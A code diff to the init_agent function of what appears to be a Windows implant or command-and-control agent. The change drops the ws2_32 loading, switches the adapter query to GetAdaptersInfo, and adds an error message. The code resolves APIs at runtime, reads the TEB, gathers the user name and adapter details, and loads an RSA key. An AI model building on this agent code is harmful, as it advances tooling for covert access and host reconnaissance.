@@ -8,11 +8,11 @@
 INT init_agent(pAgent agent) {
 
     INT ERR;
-    PCONTEXT Context = (PCONTEXT)LocalAlloc(LPTR, sizeof(CONTEXT));
-    if (Context == NULL) {
+    agent->Context = (PContextInfo)LocalAlloc(LPTR, sizeof(ContextInfo));
+    if (!agent->Context) {
+        printf("[error] attempting to allocate memory for context\n");
 		return -1;
 	}
-    agent->Context = Context;
 
 #ifdef _WIN64
     agent->pTeb = (void*)__readgsqword(0x30);
@@ -49,10 +49,6 @@ INT init_agent(pAgent agent) {
     if (agent->hWinHttp == NULL) {
         return -1;
     }
-    agent->hWs2_32 = LoadLibraryA("ws2_32.dll");
-    if (agent->hWs2_32 == NULL) {
-		return -1;
-	}
     agent->hIphlpapi = LoadLibraryA("iphlpapi.dll");
     if(agent->hIphlpapi == NULL) {
         return -1;
@@ -87,13 +83,8 @@ INT init_agent(pAgent agent) {
     //obtain advapi32 apis
     agent->pGetUserNameA = (t_GetUserNameA)GetProcAddress(agent->hAdvapi32, "GetUserNameA");
 
-    //obtain ws2_32 apis
-    agent->pInetNtop = (t_inet_ntop)GetProcAddress(agent->hWs2_32, "inet_ntop");
-    agent->pWSAStartup = (t_WSAStartup)GetProcAddress(agent->hWs2_32, "WSAStartup");
-    agent->pWSACleanup = (t_WSACleanup)GetProcAddress(agent->hWs2_32, "WSACleanup");
-
 	//obtain iphlpapi apis
-	agent->pGetAdaptersAddresses = (t_GetAdaptersAddresses)GetProcAddress(agent->hIphlpapi, "GetAdaptersAddresses");
+	agent->pGetAdaptersInfo = (t_GetAdaptersInfo)GetProcAddress(agent->hIphlpapi, "GetAdaptersInfo");
 
     //read rsa public key in der format from file.
     unsigned char* RsaPublicKeyDerBytes;
